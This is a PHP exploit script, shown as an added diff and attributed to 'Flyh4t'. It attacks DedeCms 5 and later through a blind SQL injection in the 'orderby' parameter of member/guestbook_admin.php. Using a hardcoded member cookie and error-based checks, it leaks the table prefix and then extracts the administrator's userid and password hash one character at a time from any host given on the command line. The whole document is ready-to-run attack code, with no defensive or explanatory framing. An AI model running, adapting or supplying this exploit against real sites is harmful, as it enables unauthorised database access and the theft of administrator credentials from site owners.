@@ -1,0 +1,121 @@
+﻿<?
+print_r('
+--------------------------------------------------------------------------------
+DedeCms >=5 "orderby" blind SQL injection/admin credentials disclosure exploit
+BY Flyh4t
+www.wolvez.org
+Thx for all the members of W.S.T and my friend Oldjun
+--------------------------------------------------------------------------------
+');
+
+if ($argc<3) {
+print_r('
+--------------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path
+host: target server (ip/hostname)
+path: path to DEDEcms
+Example:
+php '.$argv[0].' localhost /
+--------------------------------------------------------------------------------
+');
+die;
+}
+
+function sendpacketii($packet)
+{
+global  $host, $html;
+$ock=fsockopen(gethostbyname($host),'80');
+if (!$ock) {
+echo 'No response from '.$host; die;
+}
+fputs($ock,$packet);
+$html='';
+while (!feof($ock)) {
+$html.=fgets($ock);
+}
+fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$prefix="dede_";
+$cookie="DedeUserID=39255; DedeUserIDckMd5=31283748c5a4b36c; DedeLoginTime=1218471600; DedeLoginTimeckMd5=a7d9577b3b4820fa";
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/'))
+{echo 'Error... check the path!'; die;}
+
+/*get   $prefix*/
+$packet ="GET ".$path."/member/guestbook_admin.php?dopost=getlist&pageno=1&orderby=11' HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (eregi("in your SQL syntax",$html))
+{
+$temp=explode("From ",$html);
+$temp2=explode("member",$temp[1]);
+if($temp2[0])
+$prefix=$temp2[0];
+echo "[+]prefix -> ".$prefix."\n";
+}
+
+
+$chars[0]=0;//null
+$chars=array_merge($chars,range(48,57)); //numbers
+$chars=array_merge($chars,range(97,102));//a-f letters
+echo "[~]exploting now,plz waiting\r\n";
+
+/*get   password*/  
+$j=1;$password="";
+while (!strstr($password,chr(0)))
+{
+for ($i=0; $i<=255; $i++)
+{
+if (in_array($i,$chars))
+{
+$sql="orderby=11+and+If(ASCII(SUBSTRING((SELECT+pwd+FROM+".$prefix."admin+where+id=1),".$j.",1))=".$i.",1,(SELECT+pwd+FROM+".$prefix."member))";
+$packet ="GET ".$path."member/guestbook_admin.php?dopost=getlist&pageno=1&".$sql." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (!eregi("Subquery returns more than 1 row",$html)) {$password.=chr($i);echo"[+]pwd:".$password."\r\n";break;}
+}
+if ($i==255) {die("Exploit failed...");}
+}
+$j++;
+}
+
+/*get   userid*/
+$j=1;$admin="";
+while (!strstr($admin,chr(0)))
+{
+for ($i=0; $i<=255; $i++)
+{
+$sql="orderby=11+and+If(ASCII(SUBSTRING((SELECT+userid+FROM+".$prefix."admin+where+id=1),".$j.",1))=".$i.",1,(SELECT+pwd+FROM+".$prefix."member))";
+$packet ="GET ".$path."member/guestbook_admin.php?dopost=getlist&pageno=1&".$sql." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (!eregi("Subquery returns more than 1 row",$html)) {$admin.=chr($i);echo"[+]userid:".$admin."\r\n";break;}
+if ($i==255) {die("Exploit failed...");}
+}
+$j++;
+}
+
+
+print_r('
+--------------------------------------------------------------------------------
+[+]userid -> '.$admin.'
+[+]pwd(md5 24λ) -> '.$password.'
+--------------------------------------------------------------------------------
+');
+function is_hash($hash)
+{
+if (ereg("^[a-f0-9]{24}",trim($hash))) {return true;}
+else {return false;}
+}
+if (is_hash($password)) {echo "Exploit succeeded...";}
+else {echo "Exploit failed...";}
+?>
